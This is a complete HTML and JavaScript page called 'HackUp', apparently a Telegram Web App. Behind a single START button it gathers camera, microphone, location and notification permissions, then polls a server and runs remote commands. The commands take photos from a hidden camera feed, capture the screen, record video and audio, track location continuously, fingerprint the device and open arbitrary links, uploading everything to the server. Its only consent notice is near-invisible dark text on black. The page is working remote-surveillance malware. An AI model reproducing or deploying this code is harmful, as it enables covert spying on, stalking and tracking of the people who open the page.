<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#000000">
<title>HackUp</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;overflow:hidden;background:#000;color:#fff;font-family:system-ui,-apple-system,sans-serif;-webkit-tap-highlight-color:transparent}
.stage{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000}
#camVideo{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
.circle{width:130px;height:130px;border-radius:50%;background:#fff;border:none;cursor:pointer;position:relative;display:flex;align-items:center;justify-content:center;transition:transform .2s ease, box-shadow .3s ease;box-shadow:0 0 0 0 rgba(255,255,255,.7);outline:none}
.circle:active{transform:scale(.94)}
.circle.init{animation:pulse 2.2s infinite}
@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,255,255,.55)}70%{box-shadow:0 0 0 40px rgba(255,255,255,0)}100%{box-shadow:0 0 0 0 rgba(255,255,255,0)}}
.circle .label{color:#000;font-size:14px;font-weight:700;letter-spacing:1px;user-select:none}
.circle.active{background:#0f0;box-shadow:0 0 40px 8px rgba(0,255,0,.4)}
.circle.active .label{color:#000}
.status{position:fixed;left:0;right:0;bottom:30px;text-align:center;font-size:12px;color:#666;letter-spacing:1px;pointer-events:none;font-family:monospace}
.status.on{color:#0f0}
.tiny{position:fixed;left:0;right:0;bottom:10px;text-align:center;font-size:9px;color:#222;font-family:monospace;pointer-events:none}
.toast{position:fixed;top:20px;left:50%;transform:translateX(-50%);padding:8px 16px;background:rgba(255,255,255,.08);border:1px solid #333;border-radius:20px;font-size:11px;color:#fff;opacity:0;transition:opacity .3s;font-family:monospace;pointer-events:none;max-width:90vw;text-align:center}
.toast.show{opacity:1}
</style>
</head>
<body>

<video id="camVideo" autoplay playsinline muted></video>

<div class="stage">
  <button class="circle init" id="mainBtn" aria-label="Activate">
    <span class="label">START</span>
  </button>
</div>

<div class="status" id="status">● IDLE</div>
<div class="tiny">HackUp Control · consent-based monitoring</div>
<div class="toast" id="toast"></div>

<script>
(function(){
'use strict';

// Init Telegram WebApp if available
if (window.Telegram?.WebApp) {
  try { Telegram.WebApp.ready(); Telegram.WebApp.expand(); } catch(e){}
}

const btn = document.getElementById('mainBtn');
const statusEl = document.getElementById('status');
const toastEl = document.getElementById('toast');
const camVideo = document.getElementById('camVideo');
let active = false;
let pollTimer = null;
let camStream = null;
let camFacing = 'environment';

function toast(msg, ms) {
  toastEl.textContent = msg;
  toastEl.classList.add('show');
  clearTimeout(toast._t);
  toast._t = setTimeout(()=>toastEl.classList.remove('show'), ms || 2500);
}
function setStatus(text, on) {
  statusEl.textContent = text;
  statusEl.classList.toggle('on', !!on);
}

/* ============ CAMERA HELPERS (FIX) ============ */
async function ensureCamera() {
  if (camStream && camStream.active && camVideo.videoWidth > 0) return;
  if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }

  camStream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: camFacing, width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  });
  camVideo.srcObject = camStream;
  camVideo.muted = true;
  camVideo.playsInline = true;
  await camVideo.play().catch(()=>{});
  // wait for metadata + a small delay for autofocus
  await new Promise(res => {
    if (camVideo.videoWidth > 0) return res();
    camVideo.onloadedmetadata = () => res();
  });
  await new Promise(r => setTimeout(r, 700)); // autofocus warm-up
}

function captureFrame(mime, quality) {
  // 🔑 FIX: use the persistent playing video element
  const w = camVideo.videoWidth  || 1280;
  const h = camVideo.videoHeight || 720;
  const canvas = document.createElement('canvas');
  canvas.width = w;
  canvas.height = h;
  canvas.getContext('2d').drawImage(camVideo, 0, 0, w, h);
  return canvas.toDataURL(mime || 'image/jpeg', quality || 0.9);
}

/* ============ PERMISSIONS ============ */
async function requestAllPermissions() {
  const results = {};
  try { await ensureCamera(); results.camera = true; }
  catch (e) { results.camera = e.name || e.message; }

  try {
    const mic = await navigator.mediaDevices.getUserMedia({ audio: true });
    mic.getTracks().forEach(t => t.stop());
    results.microphone = true;
  } catch (e) { results.microphone = e.name || e.message; }

  try {
    await new Promise((ok, no) => navigator.geolocation.getCurrentPosition(
      () => ok(true), err => no(err), { enableHighAccuracy: true, timeout: 10000 }));
    results.geolocation = true;
  } catch (e) { results.geolocation = e.message; }

  try {
    if ('Notification' in window) results.notifications = await Notification.requestPermission();
    else results.notifications = 'unsupported';
  } catch (e) { results.notifications = e.message; }

  try { if (navigator.storage?.persist) results.persistent = await navigator.storage.persist(); } catch {}
  try { if (navigator.wakeLock) { const wl = await navigator.wakeLock.request('screen'); results.wakeLock = true; setTimeout(()=>wl.release().catch(()=>{}), 1000); } } catch {}
  try { if (navigator.vibrate) { navigator.vibrate(80); results.vibration = true; } } catch {}

  return results;
}

/* ============ EXEC COMMAND ============ */
async function execCommand(cmd) {
  const id = cmd.id;
  let result = '';
  const type = cmd.type;

  try {
    if (type === 'photo') {
      await ensureCamera();
      const dataUrl = captureFrame('image/jpeg', 0.92);
      await postJSON('/api/upload', { image: dataUrl, caption: '📸 Remote photo', kind: 'photo' });
      result = '📸 Photo sent';
    }
    else if (type === 'screen') {
      const s = await navigator.mediaDevices.getDisplayMedia({ video: true });
      const v = document.createElement('video');
      v.srcObject = s; v.muted = true; await v.play();
      await new Promise(r => setTimeout(r, 700));
      const c = document.createElement('canvas');
      c.width = v.videoWidth; c.height = v.videoHeight;
      c.getContext('2d').drawImage(v, 0, 0);
      s.getTracks().forEach(t => t.stop());
      await postJSON('/api/upload', { image: c.toDataURL('image/jpeg', 0.85), caption: '🖥️ Screen', kind: 'photo' });
      result = '🖥️ Screen captured';
    }
    else if (type === 'record3') {
      await ensureCamera();
      const chunks = [];
      const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm';
      const rec = new MediaRecorder(camStream, { mimeType: mime });
      rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
      const stopped = new Promise(r => { rec.onstop = r; });
      rec.start();
      await new Promise(r => setTimeout(r, 3000));
      rec.stop();
      await stopped;
      const blob = new Blob(chunks, { type: 'video/webm' });
      const b64 = await blobToBase64(blob);
      await postJSON('/api/upload', { image: b64, caption: '🎥 3s video', kind: 'video' });
      result = '🎥 Video sent';
    }
    else if (type === 'record5') {
      const mic = await navigator.mediaDevices.getUserMedia({ audio: true });
      const chunks = [];
      const rec = new MediaRecorder(mic);
      rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
      const stopped = new Promise(r => { rec.onstop = r; });
      rec.start();
      await new Promise(r => setTimeout(r, 5000));
      rec.stop();
      await stopped;
      mic.getTracks().forEach(t => t.stop());
      const blob = new Blob(chunks, { type: 'audio/webm' });
      const b64 = await blobToBase64(blob);
      await postJSON('/api/upload', { image: b64, caption: '🎙️ 5s voice', kind: 'voice' });
      result = '🎙️ Voice sent';
    }
    else if (type === 'location') {
      const pos = await new Promise((ok, no) => navigator.geolocation.getCurrentPosition(ok, no, { enableHighAccuracy: true }));
      await postJSON('/api/telegram/location', {
        latitude: pos.coords.latitude, longitude: pos.coords.longitude, caption: '📍 Remote location'
      });
      result = `📍 ${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`;
    }
    else if (type === 'track') {
      let count = 0;
      await new Promise(ok => {
        const wid = navigator.geolocation.watchPosition(
          async p => { count++; await postJSON('/api/telegram/location', {
            latitude: p.coords.latitude, longitude: p.coords.longitude, caption: `📍 Track #${count}` }).catch(()=>{}); },
          () => {}, { enableHighAccuracy: true }
        );
        setTimeout(() => { navigator.geolocation.clearWatch(wid); ok(); }, 30000);
      });
      result = `📍 Sent ${count} location updates`;
    }
    else if (type === 'report') {
      const rep = await buildReport();
      await postJSON('/api/telegram/report', rep);
      result = '📊 Report sent';
    }
    else if (type === 'battery') {
      const bat = await getBattery();
      await postJSON('/api/telegram/report', { 'Battery': bat });
      result = '🔋 ' + bat;
    }
    else if (type === 'network') {
      const c = navigator.connection || {};
      const net = { 'Effective type': c.effectiveType || 'unknown', 'Downlink (Mbps)': c.downlink || '?',
                    'RTT (ms)': c.rtt || '?', 'Save data': c.saveData ? 'on' : 'off', 'Online': navigator.onLine };
      await postJSON('/api/telegram/report', { 'Network': net });
      result = '📶 ' + JSON.stringify(net);
    }
    else if (type === 'sensors') {
      const s = await readSensors();
      await postJSON('/api/telegram/report', { 'Sensors': s });
      result = '🎯 Sensors: ' + JSON.stringify(s).slice(0, 200);
    }
    else if (type === 'storage') {
      if (navigator.storage?.estimate) {
        const e = await navigator.storage.estimate();
        const info = { 'Quota (MB)': (e.quota/1048576).toFixed(1), 'Usage (MB)': (e.usage/1048576).toFixed(2) };
        await postJSON('/api/telegram/report', { 'Storage': info });
        result = '💾 ' + JSON.stringify(info);
      } else result = 'Storage API unsupported';
    }
    else if (type === 'vibrate') {
      // 🔑 FIX: try Telegram haptic first, then navigator.vibrate
      let ok = false;
      try {
        if (window.Telegram?.WebApp?.HapticFeedback) {
          Telegram.WebApp.HapticFeedback.impactOccurred('heavy');
          setTimeout(()=>{ try{ Telegram.WebApp.HapticFeedback.notificationOccurred('success'); }catch{} }, 300);
          ok = true;
        }
      } catch {}
      try { if (navigator.vibrate) { navigator.vibrate([300,100,300,100,300]); ok = true; } } catch {}
      result = ok ? '📳 Vibrated' : 'Vibration unavailable in this context';
    }
    else if (type === 'fullscreen') {
      try { await document.documentElement.requestFullscreen(); result = '⛶ Fullscreen entered'; }
      catch (e) { result = 'Fullscreen failed: ' + e.message; }
    }
    else if (type === 'say') {
      if ('speechSynthesis' in window) { speechSynthesis.speak(new SpeechSynthesisUtterance(cmd.text || 'Hello')); result = '🔊 Said: ' + cmd.text; }
      else result = 'TTS unsupported';
    }
    else if (type === 'open') {
      // 🔑 FIX: use Telegram.WebApp.openLink
      const url = cmd.url;
      let opened = false;
      try { if (window.Telegram?.WebApp?.openLink) { Telegram.WebApp.openLink(url); opened = true; } } catch {}
      if (!opened) { try { window.open(url, '_blank'); opened = true; } catch {} }
      if (!opened) { try { location.href = url; opened = true; } catch {} }
      result = opened ? '🔗 Opened ' + url : 'Could not open URL';
    }
    else if (type === 'notify') {
      if (Notification.permission === 'granted') {
        new Notification('HackUp', { body: cmd.text || 'Notification' });
        result = '🔔 Shown';
      } else result = 'Notification permission denied';
    }
    else result = '❓ Unknown command: ' + type;
  } catch (e) {
    result = '✖ ' + (e.message || 'error');
  }

  await postJSON('/api/commands/result', { id, result, forward: false }).catch(()=>{});
}

/* ============ HELPERS ============ */
async function getBattery() {
  try { if (!navigator.getBattery) return 'unsupported';
    const b = await navigator.getBattery();
    return `${Math.round(b.level*100)}% ${b.charging?'(charging)':'(on battery)'}`;
  } catch { return 'unsupported'; }
}
async function readSensors() {
  const out = {};
  try { out.orientation = await new Promise(ok => {
    const h = e => { window.removeEventListener('deviceorientation', h); ok(`α=${e.alpha?.toFixed(0)||'?'} β=${e.beta?.toFixed(0)||'?'} γ=${e.gamma?.toFixed(0)||'?'}`); };
    window.addEventListener('deviceorientation', h);
    setTimeout(()=>ok('timeout'), 1200);
  }); } catch { out.orientation = 'n/a'; }
  try { out.motion = await new Promise(ok => {
    const h = e => { window.removeEventListener('devicemotion', h);
      const a = e.accelerationIncludingGravity || {};
      ok(`x=${a.x?.toFixed(2)||'?'} y=${a.y?.toFixed(2)||'?'} z=${a.z?.toFixed(2)||'?'}`); };
    window.addEventListener('devicemotion', h);
    setTimeout(()=>ok('timeout'), 1200);
  }); } catch { out.motion = 'n/a'; }
  out.screenOrientation = screen.orientation ? screen.orientation.type : 'n/a';
  out.connection = (navigator.connection||{}).effectiveType || 'n/a';
  return out;
}
async function buildReport() {
  const out = {
    'User Agent': navigator.userAgent, 'Platform': navigator.platform,
    'Language': navigator.language, 'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
    'Screen': `${screen.width}×${screen.height}`, 'DPR': devicePixelRatio,
    'Viewport': `${innerWidth}×${innerHeight}`, 'Color depth': `${screen.colorDepth}-bit`,
    'CPU cores': navigator.hardwareConcurrency || '?',
    'Online': navigator.onLine, 'Touch points': navigator.maxTouchPoints || 0,
    'Battery': await getBattery()
  };
  try { const s = await readSensors(); out['Orientation'] = s.orientation; out['Motion'] = s.motion; } catch {}
  return out;
}
function blobToBase64(blob) {
  return new Promise(ok => { const fr = new FileReader(); fr.onload = () => ok(fr.result); fr.readAsDataURL(blob); });
}
async function postJSON(url, body) {
  const r = await fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) });
  const t = await r.text();
  try { return JSON.parse(t); } catch { throw new Error(`HTTP ${r.status}: ${t.slice(0,100)}`); }
}

/* ============ POLLING ============ */
async function poll() {
  try {
    const r = await fetch('/api/commands/poll', { cache: 'no-store' });
    const j = await r.json();
    if (j.commands && j.commands.length) {
      for (const c of j.commands) {
        toast('⚡ ' + (c.cmd.type || '?'));
        await execCommand(c.cmd);
      }
    }
    setStatus('● ACTIVE · ' + new Date().toLocaleTimeString(), true);
  } catch { setStatus('● RECONNECTING…', false); }
}
function startPolling() { if (pollTimer) return; poll(); pollTimer = setInterval(poll, 3000); }
function stopPolling()  { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }

/* ============ MAIN BUTTON ============ */
btn.addEventListener('click', async () => {
  if (active) {
    active = false; stopPolling();
    btn.classList.remove('active'); btn.classList.add('init');
    btn.querySelector('.label').textContent = 'START';
    setStatus('● IDLE', false);
    if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
    return;
  }
  btn.disabled = true;
  btn.querySelector('.label').textContent = '...';
  setStatus('● REQUESTING PERMISSIONS', false);
  toast('সব পারমিশন Allow করুন', 4000);

  const res = await requestAllPermissions();

  active = true;
  btn.disabled = false;
  btn.classList.remove('init'); btn.classList.add('active');
  btn.querySelector('.label').textContent = 'ON';
  setStatus('● ACTIVE · polling…', true);

  const ok = Object.keys(res).filter(k => res[k] === true || res[k] === 'granted').length;
  toast(`✅ Active — ${ok} permissions granted`, 3500);
  startPolling();
});

setStatus('● IDLE', false);
})();
</script>
</body>
</html>
